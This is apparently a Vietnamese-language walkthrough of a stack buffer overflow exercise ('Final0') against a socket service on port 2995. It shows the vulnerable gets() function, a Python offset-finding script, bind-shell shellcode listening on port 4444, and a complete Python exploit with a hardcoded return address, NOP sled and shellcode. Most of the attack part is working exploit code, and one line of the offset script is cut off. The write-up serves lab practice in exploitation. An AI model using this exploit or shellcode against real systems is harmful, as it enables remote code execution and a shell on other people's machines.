#1-Final0
- Đầu tiên xem flow của chương trình có thể thấy đây là bài về socket lỗ hổng stack bởi có hàm gets(buffer) bài này em hướng thực hiện shellcode gọi /bin/sh vì checksec NX disable.
```
char *get_username()
{
  char buffer[512];
  char *q;
  int i;

  memset(buffer, 0, sizeof(buffer));
  gets(buffer);

  /* Strip off trailing new line characters */
  q = strchr(buffer, '\n');
  if(q) *q = 0;
  q = strchr(buffer, '\r');
  if(q) *q = 0;

  /* Convert to lower case */
  for(i = 0; i < strlen(buffer); i++) {
      buffer[i] = toupper(buffer[i]);
  }

  /* Duplicate the string and return it */
  return strdup(buffer);
}
```
- Đầu tiên cần tìm offset từ buffer tới chỗ return tiện có đoạn source code trên mạng nên dùng luôn

```
import socket
import sys

HOST = '127.0.0.1'
PORT = 2995
i = 0
while(1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((HOST,PORT))
        data = "a"*512 + "b"*i + "\n"
        offset = i
        sock.send(data)
        data = sock.recv(2048)
        data.decode("utf-8")
        if(not data.startswith("No")):
                print "Offset from buffer to return address is: ", str(offs$
                sock.close()
                break
        sock.recv(1024)
        sock.close()
        i +=1
```
![Screenshot 2022-03-29 151105](https://i.imgur.com/uFDgscq.png)

- Về shell code có thể ở trên mạng hoặc dùng metasploit framework để tạo shell nhưng phải là shell liên kết TCP để lắng nghe trên một cổng và đợi kết nối. Ở đây shellcode dùng cổng 4444
```
shellcode = "\xba\x5f\x74\xd6\x3c\xdb\xcd\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"\
"\x14\x31\x56\x14\x03\x56\x14\x83\xc6\x04\xbd\x81\xe7\xe7\xb6"\
"\x89\x5b\x5b\x6b\x24\x5e\xd2\x6a\x08\x38\x29\xec\x32\x9b\xe3"\
"\x84\xc6\x23\x15\x08\xad\x33\x44\xe0\xb8\xd5\x0c\x66\xe3\xd8"\
"\x51\xef\x52\xe7\xe2\xeb\xe4\x81\xc9\x73\x47\xfe\xb4\xbe\xc8"\
"\x6d\x61\x2a\xf6\xc9\x5f\x2a\x41\x93\xa7\x42\x7d\x4c\x2b\xfa"\
"\xe9\xbd\xa9\x93\x87\x48\xce\x33\x0b\xc2\xf0\x03\xa0\x19\x72"
```
- Viết exploit gắn deadbeef để kiểm tra địa chỉ có thể thực thi.
```
from socket import *
from struct import *

s = socket(AF_INET, SOCK_STREAM)
s.connect(("192.168.159.128", 2995))

buffer = "a"*532
ret = "\xef\xbe\xad\xde"
nop = "\x90"*20


shellcode = "\xba\x5f\x74\xd6\x3c\xdb\xcd\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"\
"\x14\x31\x56\x14\x03\x56\x14\x83\xc6\x04\xbd\x81\xe7\xe7\xb6"\
"\x89\x5b\x5b\x6b\x24\x5e\xd2\x6a\x08\x38\x29\xec\x32\x9b\xe3"\
"\x84\xc6\x23\x15\x08\xad\x33\x44\xe0\xb8\xd5\x0c\x66\xe3\xd8"\
"\x51\xef\x52\xe7\xe2\xeb\xe4\x81\xc9\x73\x47\xfe\xb4\xbe\xc8"\
"\x6d\x61\x2a\xf6\xc9\x5f\x2a\x41\x93\xa7\x42\x7d\x4c\x2b\xfa"\
"\xe9\xbd\xa9\x93\x87\x48\xce\x33\x0b\xc2\xf0\x03\xa0\x19\x72"

print(buffer + ret + nop + shellcode)
s.send(buffer + ret + nop + shellcode)
```
- Debug chương trình core được lưu ở /tmp
![Screenshot 2022-03-29 151855](https://i.imgur.com/5nGokP9.png)
- Thấy được deadbeef chọn địa chỉ thực thi thay vào là thành công 
![Screenshot 2022-03-29 151937](https://i.imgur.com/aXHfW7w.png)
- Ở đây chọn địa chỉ 0xbffffc68
- Exploit hoàn chỉnh 
```
from socket import *
from struct import *

s = socket(AF_INET, SOCK_STREAM)
s.connect(("192.168.159.128", 2995))

buffer = "a"*532
ret = "\x68\xfc\xff\xbf"
nop = "\x90"*20

shellcode = "\xba\x5f\x74\xd6\x3c\xdb\xcd\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"\
"\x14\x31\x56\x14\x03\x56\x14\x83\xc6\x04\xbd\x81\xe7\xe7\xb6"\
"\x89\x5b\x5b\x6b\x24\x5e\xd2\x6a\x08\x38\x29\xec\x32\x9b\xe3"\
"\x84\xc6\x23\x15\x08\xad\x33\x44\xe0\xb8\xd5\x0c\x66\xe3\xd8"\
"\x51\xef\x52\xe7\xe2\xeb\xe4\x81\xc9\x73\x47\xfe\xb4\xbe\xc8"\
"\x6d\x61\x2a\xf6\xc9\x5f\x2a\x41\x93\xa7\x42\x7d\x4c\x2b\xfa"\
"\xe9\xbd\xa9\x93\x87\x48\xce\x33\x0b\xc2\xf0\x03\xa0\x19\x72"

print(buffer + ret + nop + shellcode)
s.send(buffer + ret + nop + shellcode)
```
- Thực thi và nghe cổng 4444 là thành công 
![Screenshot 2022-03-29 152235](https://i.imgur.com/Y1JFWuA.png)![Screenshot 2022-03-29 152253](https://i.imgur.com/U3yDx09.png)![Screenshot 2022-03-29 152313](https://i.imgur.com/HrdPSyi.png)